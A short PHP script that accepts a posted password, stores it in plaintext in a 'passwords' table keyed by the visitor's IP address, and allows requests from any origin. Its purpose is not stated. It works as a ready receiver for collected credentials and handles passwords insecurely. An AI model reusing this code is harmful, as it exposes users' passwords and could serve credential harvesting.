<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

require 'db.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $device_id = $_SERVER['REMOTE_ADDR'];
    $password = htmlspecialchars(trim($_POST["password"]));

    if ($password) {
        $pdo->prepare("INSERT INTO passwords (device_id, password) VALUES (?, ?)")
            ->execute([$device_id, $password]);
        echo json_encode(["status" => "saved", "device_id" => $device_id]);
    } else {
        echo json_encode(["status" => "error", "message" => "Missing password"]);
    }
}
?>